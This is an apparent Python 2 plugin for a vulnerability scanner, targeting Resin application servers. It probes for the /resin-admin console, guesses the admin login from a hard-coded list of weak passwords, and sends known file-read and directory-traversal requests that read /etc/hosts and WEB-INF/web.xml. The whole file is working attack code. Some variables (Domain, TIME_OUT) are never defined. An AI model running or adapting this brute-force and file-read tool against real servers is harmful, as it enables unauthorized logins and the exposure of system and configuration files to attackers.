#!/usr/bin/env python
# coding:utf-8
import logging
import lib.requests as requests
import random
from lib.config import (
    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
)

def plugin_info():
    return {
        "name": "resin_vul",
        "info": "resin弱口令和任意文件读取",
        "Author":"Jaqen",
        "Create_date":"2017-10-01"
    }

def exploit(ip):
    result = []
    if Domain:
        for domain in Domain:
            try:
                resp = requests.get(domain+"/resin-admin", timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
            except Exception,e:
                logging.error(e)
                return
            if "/resin-admin/default.css" in resp.text:
                result.append('%s/resin-admin >>>> 存在Resin管理口'%domain)
                flag_list=['<th>Resin home:</th>','The Resin version','Resin Summary']
                user_list=['admin']
                pass_list=['admin','123456','12345678','123456789','admin123','admin888','admin1','administrator','8888888','123123','admin','manager','root']
                login_url = domain+'/resin-admin/j_security_check?j_uri=index.php'
                for user in user_list:
                    for password in pass_list:
                        try:
                            data = {'j_username':user,'j_password':password}
                            resp = requests.post(login_url, data=data, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                        except Exception,e:
                            logging.error(e)
                            continue
                        for flag in flag_list:
                            if flag in resp.text or resp.status_code == 408:
                                result.append('%s/resin-admin >>>> 存在Resin弱口令 %s:%s'%(domain,user,password))
                vul_uri = [["/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts","localhost"],
                ["/resin-doc/viewfile/?contextpath=/otherwebapp&servletpath=&file=WEB-INF/web.xml","xml version"],
                ["/%20..\\web-inf","<h1>Directory of"],
                ["/%3f.jsp","<h1>Directory of"]
                ]
                for uri in vul_uri:
                    try:
                        url = domain+uri[0]
                        resp = requests.get(url, timeout=TIME_OUT, proxies=MY_PROXY, headers={"User-Agent": random.choice(USER_AGENT_LIST)}, allow_redirects=True, verify=False)
                    except Exception,e:
                        logging.error(e)
                        continue
                    if uri[1] in resp.text:
                        result.append('%s >>>> 存在Resin任意文件读取'%url)
        if len(result):
            return result